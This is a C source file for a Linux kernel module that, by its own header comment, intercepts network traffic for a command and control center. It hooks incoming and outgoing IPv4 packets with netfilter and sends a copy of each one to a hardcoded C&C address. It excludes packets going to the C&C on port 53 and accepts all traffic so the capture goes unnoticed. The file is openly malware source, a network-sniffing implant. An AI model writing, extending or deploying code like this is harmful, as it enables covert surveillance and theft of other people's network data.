/*
    * This file contains functions that intercept network traffic and then send it to the command and control center.
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include "socket.c"
#include <linux/netdevice.h>
#include <net/sock.h>

#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

#define COMMAND_AND_CONTROL_IP "192.168.50.2"

/* Transform the ip address (__be32) to make it human readable (so you can use the strcmp comparison functions). IPV4 */
#define NIPQUAD(addr) \ 
	((unsigned char *)&addr)[0], \
	((unsigned char *)&addr)[1], \
	((unsigned char *)&addr)[2], \
	((unsigned char *)&addr)[3]
#define NIPQUAD_FMT "%u.%u.%u.%u"

/* Transform the ip address (__be32) to make it human readable (so you can use the strcmp comparison functions). IPV6 */
#define NIP6(addr) \
    ntohs((addr).s6_addr16[0]), \
    ntohs((addr).s6_addr16[1]), \
    ntohs((addr).s6_addr16[2]), \
    ntohs((addr).s6_addr16[3]), \
    ntohs((addr).s6_addr16[4]), \
    ntohs((addr).s6_addr16[5]), \
    ntohs((addr).s6_addr16[6]), \
    ntohs((addr).s6_addr16[7])


static unsigned int packetOutNetworkStack (void *priv,struct sk_buff *skb,const struct nf_hook_state *state);
static unsigned int packetToNetworkStack (void *priv,struct sk_buff *skb,const struct nf_hook_state *state);
static unsigned int packetCapturer(void *priv,struct sk_buff *skb,const struct nf_hook_state *state);
static unsigned int registerPacketCapturerHook(void);
static void unregisterPacketCapturerHook(void);

extern __be32 in_aton(const char *str); /* Transform a text string with an ip to kernel format (exported symbol). */
static int sendNetwork(struct sk_buff *skb); /* socket.c file */

/* https://blogs.oracle.com/linux/post/introduction-to-netfilter
    *NF_INET_PRE_ROUTING: The callbacks registered to this hook will be triggered by any incoming traffic very soon after entering the network stack.
         *This hook is processed before any routing decisions have been made regarding where to send the packet i.e. to check if this packet is destined for another interface, or a local process. 
         *The routing code may drop packets that are unrouteable.
    *NF_INET_LOCAL_IN: The callbacks registered to this hook are triggered after an incoming packet has been routed and the packet is destined for the local system.
    *NF_INET_FORWARD: The callbacks registered to this hook are triggered after an incoming packet has been routed and the packet is to be forwarded to another host.
    *NF_INET_LOCAL_OUT: The callbacks registered to this hook are triggered by any locally created outbound traffic as soon it hits the network stack.
    *NF_INET_POST_ROUTING: The callbacks registered to this hook are triggered by any outgoing or forwarded traffic after routing has taken place and just before being put out on the wire.
*/

static struct nf_hook_ops toNetworkStack = {
    .hook       = packetToNetworkStack,
    .hooknum    = NF_INET_LOCAL_IN, // ? Incoming packet to network stack
    .pf         = PF_INET, // ? IPV4
    .priority   = NF_IP_PRI_FIRST, // ? First priority
};

static struct nf_hook_ops outNetworkStack = {
    .hook       = packetOutNetworkStack,
    .hooknum    = NF_INET_LOCAL_OUT, // ? Outbound packet network stackt
    .pf         = PF_INET, // ? IPV4
    .priority   = NF_IP_PRI_FIRST, // ? First priority
};

/* 
    ? - void *priv; -> A pointer to private data in nf_hook_ops.
    ? - struct sk_buff *skb; -> A pointer to main networking structure representing a packet.
    ? - const struct nf_hook_state *state; -> A pointer to a nf_hook_state structure that contains information 
        ?about the hook point, such as the network protocol, the network interface, and the routing information.
*/

static unsigned int packetToNetworkStack (void *priv,struct sk_buff *skb,const struct nf_hook_state *state){
    sendNetwork(skb); /* Allways send to C&D */
    return NF_ACCEPT; /* Allways accept packet */
}

/* Do not send packets to command and control to avoid a loop.*/
static unsigned int packetOutNetworkStack (void *priv,struct sk_buff *skb,const struct nf_hook_state *state){
    struct iphdr *iph; /* IP header struct */
    struct tcphdr * tcph; /* TCP header struct */
    struct udphdr *udph; /* UDP header struct */
    iph = ip_hdr(skb); /* Return ipheader from sk_buff */ //Same as (struct iphdr*)skb_network_header(skb);
     __u32 deny = in_aton(COMMAND_AND_CONTROL_IP); 
    if(iph->protocol == IPPROTO_UDP){
        udph = (struct udphdr*) skb_transport_header(skb);
        //if(iph->daddr == deny && ntohs(udph->dest)==53)
        if(iph->daddr == deny && ntohs(udph->dest)==53){ /* daddr (destination address) nthos translate port to int */
            // ! Watch out the port is uint16, also the ntohs() function is used for endianess
            #if verbose == 1
                pr_info(" Paquete al server bloqueado: %d.%d.%d.%d! source: %hu dest: %hu\n",NIPQUAD(iph->saddr),ntohs(udph->source),ntohs(udph->dest));
            #endif
            } else{
                sendNetwork(skb);
            }
            }
        else{
            sendNetwork(skb);
        }
    
    return NF_ACCEPT; /*Always accept packet*/
}
/*
    * Accept: The packet is allowed to continue to the next hook point or the destination.
    * Drop: The packet is silently discarded and no further processing is done.
    * Queue: The packet is queued for userspace processing by a daemon such as iptables or nftables.
    * Repeat: The packet is re-injected at the same hook point for another round of processing.
    * Stop: The packet is accepted and no further processing is done.
*/

static unsigned int registerPacketCapturerHook(){
    return nf_register_net_hook(&init_net, &toNetworkStack);
    return nf_register_net_hook(&init_net, &outNetworkStack);
}
static void unregisterPacketCapturerHook(){
    nf_unregister_net_hook(&init_net, &toNetworkStack);
    nf_unregister_net_hook(&init_net, &outNetworkStack);
}

